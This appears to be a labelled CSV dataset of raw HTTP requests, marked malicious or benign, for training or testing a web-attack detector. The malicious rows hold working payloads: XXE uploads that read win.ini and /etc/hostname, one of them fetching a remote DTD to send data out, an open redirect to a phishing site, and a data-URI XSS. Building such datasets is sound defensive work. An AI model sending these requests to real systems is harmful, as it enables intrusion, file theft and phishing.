label,text
malicious,"POST /api/importConfiguration HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate, br
Referer: https://community.game-dev-forum.org/settings
Cache-Control: no-cache
Content-Type: multipart/form-data; boundary=----BoundaryGameDev999
Content-Length: 465

------BoundaryGameDev999
Content-Disposition: form-data; name=""configType""

default
------BoundaryGameDev999
Content-Disposition: form-data; name=""upload""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------BoundaryGameDev999--"
malicious,"GET /authorize?redirect_url=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: financial-advisor-portal.co.uk
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://financial-advisor-portal.co.uk/
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: green-energy-consortium.org
Accept: image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Via: 1.1 google
Referer: https://green-energy-consortium.org/initiatives/solar-power"
malicious,"POST /integration/xml HTTP/1.1
Host: fintech.api-platform-labs.com
Content-Type: application/xml
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml, text/xml, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Content-Length: 306

<!DOCTYPE integration [
<!ENTITY % f SYSTEM ""file:///etc/hostname"">
<!ENTITY % p SYSTEM ""http://malicious-feeds.fintech.api-platform-labs.com/payload.dtd"">
%p;
%attackSend;
]>
<integration><payload>data here</payload></integration>"
benign,"DELETE /api/v1/orders/194857320 HTTP/1.1
Host: fast-food-delivery-services.eu
Authorization: Bearer ZNlT8r1mXvfWPpeSFDkGyRc0nUzIROoXa6bajqBLs
Accept: application/json
Referer: https://fast-food-delivery-services.eu/orders/history
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 Chrome/91.0.4472.114 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /user/settings/load?id=acct-98bcae4d-de12-4be1-baa4-8a3d53e9f3cd HTTP/1.1
Host: secure-membership-app.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: application/json
Accept-Language: en-US
DNT: 1
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /content-manager/csv-upload HTTP/1.1
Host: editor.my-personal-blog-site.info
User-Agent: Firefox/114.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Content-Type: text/csv
Content-Length: 109
Pragma: no-cache
Cache-Control: no-store
Connection: close
Referer: https://editor.my-personal-blog-site.info/dashboard

date,title,category
2024-05-22,Deploy_New_Features,Technology
2024-05-23,Spring_Gardening_Tips,Lifestyle
2024-05-24,Top_Mountain_Trails,Travel"
benign,"POST /user/contact HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: close
Origin: https://secure-user-portal.net

username=james_brown&message=Please+note+that+to+UPDATE+the+database,+you+should+use+WHERE+clauses+carefully+to+avoid+errors."
malicious,"GET /app/user/redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Connection: close
Origin: https://api.cloud-data-services.ai"
benign,"GET /robots.txt HTTP/1.1
Host: cloud-app-services.us
User-Agent: DataAnalyticsBot/0.9 (+http://dataanalyticsbot.cloud)
Accept-Encoding: gzip
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
